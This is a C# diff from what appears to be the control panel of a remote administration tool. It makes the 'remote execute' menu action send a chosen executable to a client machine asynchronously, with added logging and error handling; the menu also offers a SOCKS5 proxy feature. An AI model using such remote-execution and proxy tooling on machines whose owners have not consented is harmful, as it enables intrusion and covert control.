@@ -40,26 +40,33 @@ internal static class FeatureContextMenu
         admin.Items.Add(MakeItem(Lang.Get("FEAT_DEVICE_MGR"),      "SvgImages/Icon Builder/Electronics_Mouse.svg",          () => mainWindow.OpenFeatureWindow<DeviceManagerWindow>(clientId,   () => new DeviceManagerWindow(server, clientId, clientId))));
         admin.Items.Add(MakeItem(Lang.Get("FEAT_SOCKS5"),          "SvgImages/Icon Builder/Business_World.svg",         () => mainWindow.OpenFeatureWindow<Socks5Window>(clientId,          () => new Socks5Window(server, clientId, clientId))));
         admin.Items.Add(new Separator());
-        admin.Items.Add(MakeItem(Lang.Get("FEAT_REMOTE_EXEC"),     "SvgImages/Icon Builder/Actions_Send.svg",           () =>
+        admin.Items.Add(MakeItem(Lang.Get("FEAT_REMOTE_EXEC"),     "SvgImages/Icon Builder/Actions_Send.svg",           async () =>
         {
             var dlg = new Microsoft.Win32.OpenFileDialog
             {
                 Filter = "Executable (*.exe)|*.exe|All Files (*.*)|*.*",
                 Title  = "Select file to execute on client"
             };
-            if (dlg.ShowDialog() == true)
+            if (dlg.ShowDialog() != true) return;
+            try
             {
+                var bytes = await System.IO.File.ReadAllBytesAsync(dlg.FileName);
                 var data = new RemoteFileExecData
                 {
                     FileName   = System.IO.Path.GetFileName(dlg.FileName),
-                    FileBase64 = Convert.ToBase64String(System.IO.File.ReadAllBytes(dlg.FileName))
+                    FileBase64 = Convert.ToBase64String(bytes)
                 };
-                _ = server.SendToClient(clientId, new Packet
+                await server.SendToClient(clientId, new Packet
                 {
                     Type = PacketType.RemoteFileExec,
                     Data = Newtonsoft.Json.JsonConvert.SerializeObject(data)
                 });
                 ServerWindow.ReportGlobalActivity("Remote execute", clientId, "running");
+                ServerWindow.LogGlobal($"[ADMIN] Remote execute '{System.IO.Path.GetFileName(dlg.FileName)}' sent to {clientId}.");
+            }
+            catch (Exception ex)
+            {
+                ServerWindow.LogGlobal($"[!] Remote execute failed for {clientId}: {ex.Message}");
             }
         }));
         menu.Items.Add(admin);
